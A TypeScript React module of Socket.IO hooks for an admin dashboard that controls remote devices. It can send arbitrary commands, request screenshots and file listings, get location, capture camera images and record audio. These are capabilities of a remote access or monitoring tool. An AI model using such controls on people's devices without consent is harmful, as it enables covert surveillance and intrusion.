'use client';

import { useEffect, useRef, useState } from 'react';
import { initSocket, getSocket, disconnectSocket, type SocketEvents } from '@/lib/socket';
import type { Socket } from 'socket.io-client';

export interface UseSocketOptions {
  autoConnect?: boolean;
  serverUrl?: string;
}

export interface UseSocketReturn {
  socket: Socket | null;
  connected: boolean;
  error: string | null;
  connect: () => void;
  disconnect: () => void;
  emit: (event: string, data?: any) => void;
  on: (event: string, callback: (data: any) => void) => void;
  off: (event: string, callback?: (data: any) => void) => void;
}

/**
 * Custom hook for managing Socket.IO connection
 */
export function useSocket(options: UseSocketOptions = {}): UseSocketReturn {
  const { autoConnect = true, serverUrl } = options;
  const [connected, setConnected] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const socketRef = useRef<Socket | null>(null);

  useEffect(() => {
    if (autoConnect) {
      connect();
    }

    return () => {
      disconnect();
    };
  }, [autoConnect, serverUrl]);

  const connect = () => {
    try {
      setError(null);
      
      if (socketRef.current?.connected) {
        return;
      }

      const socket = initSocket(serverUrl);
      socketRef.current = socket;

      socket.on('connect', () => {
        setConnected(true);
        setError(null);
      });

      socket.on('disconnect', (reason) => {
        setConnected(false);
        if (reason === 'io server disconnect') {
          // Server disconnected - try to reconnect
          socket.connect();
        }
      });

      socket.on('connect_error', (err) => {
        setConnected(false);
        setError(err.message || 'Connection failed');
      });

    } catch (err) {
      setError(err instanceof Error ? err.message : 'Unknown error');
      setConnected(false);
    }
  };

  const disconnect = () => {
    if (socketRef.current) {
      socketRef.current.disconnect();
      socketRef.current = null;
    }
    setConnected(false);
    setError(null);
  };

  const emit = (event: string, data?: any) => {
    if (socketRef.current?.connected) {
      socketRef.current.emit(event, data);
    } else {
      setError('Socket not connected');
    }
  };

  const on = (event: string, callback: (data: any) => void) => {
    if (socketRef.current) {
      socketRef.current.on(event, callback);
    }
  };

  const off = (event: string, callback?: (data: any) => void) => {
    if (socketRef.current) {
      if (callback) {
        socketRef.current.off(event, callback);
      } else {
        socketRef.current.removeAllListeners(event);
      }
    }
  };

  return {
    socket: socketRef.current,
    connected,
    error,
    connect,
    disconnect,
    emit,
    on,
    off
  };
}

/**
 * Hook for device-specific socket events
 */
export function useDeviceSocket(deviceId: string, options: UseSocketOptions = {}) {
  const { socket, connected, error, connect, disconnect } = useSocket(options);
  const [deviceData, setDeviceData] = useState<any>(null);
  const [lastScreenshot, setLastScreenshot] = useState<string | null>(null);
  const [commandResults, setCommandResults] = useState<Record<string, any>>({});

  useEffect(() => {
    if (!socket || !connected) return;

    // Device status events
    const handleDeviceStatus = (data: any) => {
      if (data.deviceId === deviceId) {
        setDeviceData(data.status);
      }
    };

    // Screenshot events
    const handleScreenUpdate = (data: any) => {
      if (data.deviceId === deviceId) {
        setLastScreenshot(data.screenshot);
      }
    };

    // Command result events
    const handleCommandResult = (data: any) => {
      if (data.deviceId === deviceId) {
        setCommandResults(prev => ({
          ...prev,
          [data.commandId]: data.result
        }));
      }
    };

    socket.on('device:status', handleDeviceStatus);
    socket.on('screen:update', handleScreenUpdate);
    socket.on('command:result', handleCommandResult);

    return () => {
      socket.off('device:status', handleDeviceStatus);
      socket.off('screen:update', handleScreenUpdate);
      socket.off('command:result', handleCommandResult);
    };
  }, [socket, connected, deviceId]);

  const sendCommand = (command: string) => {
    if (socket && connected) {
      const commandId = `cmd_${Date.now()}`;
      socket.emit('device:command', { deviceId, command, commandId });
      return commandId;
    }
    return null;
  };

  const requestScreenshot = () => {
    if (socket && connected) {
      socket.emit('device:screenshot', { deviceId });
    }
  };

  const getFiles = (path?: string) => {
    if (socket && connected) {
      socket.emit('device:files', { deviceId, path });
    }
  };

  const getLocation = () => {
    if (socket && connected) {
      socket.emit('device:location', { deviceId });
    }
  };

  const captureCamera = (camera: 'front' | 'back' = 'back') => {
    if (socket && connected) {
      socket.emit('device:camera', { deviceId, camera });
    }
  };

  const recordAudio = (duration: number = 10) => {
    if (socket && connected) {
      socket.emit('device:audio', { deviceId, duration });
    }
  };

  const getApps = () => {
    if (socket && connected) {
      socket.emit('device:apps', { deviceId });
    }
  };

  const sendNotification = (message: string) => {
    if (socket && connected) {
      socket.emit('device:notify', { deviceId, message });
    }
  };

  return {
    socket,
    connected,
    error,
    connect,
    disconnect,
    deviceData,
    lastScreenshot,
    commandResults,
    // Device control methods
    sendCommand,
    requestScreenshot,
    getFiles,
    getLocation,
    captureCamera,
    recordAudio,
    getApps,
    sendNotification
  };
}

/**
 * Hook for admin dashboard socket events
 */
export function useAdminSocket(adminId: string, options: UseSocketOptions = {}) {
  const { socket, connected, error, connect, disconnect } = useSocket(options);
  const [connectedDevices, setConnectedDevices] = useState<string[]>([]);
  const [deviceEvents, setDeviceEvents] = useState<any[]>([]);

  useEffect(() => {
    if (!socket || !connected || !adminId) return;

    // Authenticate admin and join room
    socket.emit('admin:authenticate', { adminId });
    socket.emit('admin:join', { adminId });

    // Device connection events
    const handleDeviceConnect = (data: any) => {
      setConnectedDevices(prev => {
        if (!prev.includes(data.deviceId)) {
          return [...prev, data.deviceId];
        }
        return prev;
      });
      
      setDeviceEvents(prev => [{
        type: 'connect',
        deviceId: data.deviceId,
        timestamp: new Date().toISOString(),
        data
      }, ...prev.slice(0, 99)]); // Keep last 100 events
    };

    const handleDeviceDisconnect = (data: any) => {
      setConnectedDevices(prev => prev.filter(id => id !== data.deviceId));
      
      setDeviceEvents(prev => [{
        type: 'disconnect',
        deviceId: data.deviceId,
        timestamp: new Date().toISOString(),
        data
      }, ...prev.slice(0, 99)]);
    };

    // General device events
    const handleDeviceEvent = (eventType: string) => (data: any) => {
      setDeviceEvents(prev => [{
        type: eventType,
        deviceId: data.deviceId,
        timestamp: new Date().toISOString(),
        data
      }, ...prev.slice(0, 99)]);
    };

    socket.on('device:connect', handleDeviceConnect);
    socket.on('device:disconnect', handleDeviceDisconnect);
    socket.on('device:status', handleDeviceEvent('status'));
    socket.on('command:result', handleDeviceEvent('command'));
    socket.on('screen:update', handleDeviceEvent('screen'));

    return () => {
      socket.off('device:connect', handleDeviceConnect);
      socket.off('device:disconnect', handleDeviceDisconnect);
      socket.off('device:status');
      socket.off('command:result');
      socket.off('screen:update');
    };
  }, [socket, connected, adminId]);

  const clearEvents = () => setDeviceEvents([]);

  return {
    socket,
    connected,
    error,
    connect,
    disconnect,
    connectedDevices,
    deviceEvents,
    clearEvents
  };
}